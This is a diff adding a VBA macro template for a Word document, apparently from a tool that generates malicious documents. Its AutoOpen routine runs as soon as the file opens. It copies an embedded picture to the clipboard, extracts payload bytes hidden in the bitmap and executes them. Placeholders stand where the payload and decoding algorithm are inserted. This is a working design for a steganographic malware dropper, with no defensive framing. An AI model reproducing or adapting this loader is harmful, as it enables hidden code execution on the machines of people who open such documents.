@@ -1,0 +1,36 @@
+'I am slowly loosing my mental health here
+{{{ ARCH_IMPORTS }}}
+
+Const CF_BITMAP = 2
+Const IMAGE_BITMAP = 0
+Const LR_COPYRETURNORG = &H4
+Const LR_CREATEDIBSECTION = &H2000
+Const BYTE_LENGTH = {{{ BYTE_LENGTH }}}
+
+{{{ PAYLOAD_CODE }}}
+
+{{{ ALGORITHM_CODE }}}
+
+Sub AutoOpen()
+    ActiveDocument.InlineShapes(1).Range.CopyAsPicture
+
+    Dim lAvailable As Long, lResult As Long
+    lAvailable = IsClipboardFormatAvailable(CF_BITMAP)
+
+    If lAvailable <> 0 Then
+        'Dim hKeyboard As Long, hPtr As Long, hBitmap As Long, Bmp As BITMAP
+        Dim hKeyboard As Long, hPtr As LongPtr, hBitmap As LongPtr, Bmp As BITMAP
+
+        hKeyboard = OpenClipboard(0&)
+        hPtr = GetClipboardData(CF_BITMAP)
+        hBitmap = CopyImage(hPtr, IMAGE_BITMAP, 0, 0, LR_COPYRETURNORG Or LR_CREATEDIBSECTION)
+        hKeyboard = CloseClipboard
+
+        lResult = GetObjectA(hBitmap, Len(Bmp), Bmp)
+
+        Dim bPayloadArr() As Byte
+        bPayloadArr = Read(Bmp, BYTE_LENGTH)
+
+        Run bPayloadArr
+    End If
+End Sub
